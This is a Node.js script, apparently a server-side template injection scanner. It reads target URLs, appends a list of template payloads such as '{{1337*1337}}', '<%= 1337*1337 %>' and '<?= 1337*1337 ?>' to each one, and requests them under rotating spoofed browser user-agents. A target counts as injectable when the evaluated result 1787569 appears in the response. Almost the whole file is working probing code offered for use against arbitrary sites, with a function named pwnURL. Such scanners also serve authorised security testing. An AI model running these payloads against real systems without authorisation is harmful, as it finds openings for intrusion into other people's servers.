import readline from 'readline';
import axios from 'axios';
import { URL } from 'url';
import chalk from 'chalk';
import yargs from 'yargs';
import { hideBin } from 'yargs/helpers';
import fs from 'fs';

const argv = yargs(hideBin(process.argv))
  .option('log', {
    alias: 'l',
    description: 'Log output to file',
    type: 'boolean',
    default: false,
  })
  .option('user-agent', {
    alias: 'u',
    description: 'Use a specific user-agent',
    type: 'string',
  })
  .option('value', {
    alias: 'v',
    description: 'Use a specific injection value',
    type: 'string',
  })
  .help()
  .alias('help', 'h')
  .argv;

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
  "Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/88.0.705.50",
  "Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
];

const injectedValues = [
  "{{1337*1337}}", // Mustache or Handlebars templating
  "<%= 1337*1337 %>", // Embedded Ruby (ERB) or EJS (Embedded JavaScript Templating)
  "${1337*1337}", // JavaScript template literals or Bash-like shell scripts
  "{% 1337*1337 %}", // Jinja2, Twig, or other similar templating engines
  "{{= 1337*1337 }}", // Underscore.js templating
  "{{{1337*1337}}}", // Handlebars raw block for unescaped content
  "<% 1337*1337 %>", // ERB (Ruby) or EJS without output encoding
  "{{1337*1337}}", // AngularJS or other frameworks with similar syntax
  "<?= 1337*1337 ?>", // PHP short echo tag
  "{!! 1337*1337 !!}", // Blade templating engine (Laravel) for unescaped content
  "<# 1337*1337 #>", // FreeMarker templating engine
  "[[1337*1337]]", // Thymeleaf or other similar XML/XHTML-based templating engines,
];

let successfulInjections = [];
let userAgentIndex = 0;

const pwnURL = async (baseUrl) => {
  const userAgent = argv['user-agent'] || userAgents[userAgentIndex++ % userAgents.length];
  const valuesToTest = argv.value ? [argv.value] : injectedValues;

  for (const value of valuesToTest) {
    const testUrl = baseUrl + value;

    try {
      const response = await axios.get(testUrl, {
        headers: { "User-Agent": userAgent },
      });
      const body = response.data;

      if (body.includes("1787569")) {
        console.log(chalk.green(`Success for ${value} on ${testUrl}`));
        successfulInjections.push({ value, url: testUrl });
      } else {
        console.log(chalk.yellow(`No reflection for ${value} on ${testUrl}`));
      }
    } catch (error) {
      console.error(chalk.red(`Error with ${value}: ${error.message}`));
    }
  }

  displayResults();
};

const displayResults = () => {
  if (successfulInjections.length > 0) {
    console.log(chalk.blue("\n--- Successful Injections ---"));
    successfulInjections.forEach((injection) => {
      const output = chalk.green(`Value: ${injection.value}\nURL: ${injection.url}\n`);
      console.log(output);

      if (argv.log) {
        fs.appendFileSync('log.txt', `${output}\n`, 'utf8');
      }
    });
  } else {
    console.log(chalk.blue("\nNo successful injections found."));
  }

  successfulInjections = []; // Reset for next input
};

rl.on("line", (input) => {
  try {
    const parsedURL = new URL(input);
    pwnURL(parsedURL.href);
  } catch (error) {
    console.error(chalk.red(`Error parsing URL: ${error.message}`));
  }
});